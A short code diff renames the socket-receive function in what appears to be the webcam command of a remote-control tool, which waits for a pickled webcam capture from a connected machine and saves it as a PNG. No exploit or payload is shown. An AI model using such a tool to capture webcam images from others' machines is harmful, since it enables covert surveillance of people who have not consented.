@@ -15,7 +15,7 @@ def main(sock):
         config.app.logger.info("[library/commands/direct_interface/webcam] - Waiting for raw webcam pickle to arrive")
     elif interface == "CUI":
         print(config.inf + 'Waiting for raw webcam pickle to arrive')
-    raw_bytes = recv_all.main(sock)
+    raw_bytes = recv_all.main_recv(sock)
     file_name = datetime.now().strftime('%Y-%m-%d_%H-%M-%S.png')
     if type(raw_bytes) is str:
         if interface == "GUI":
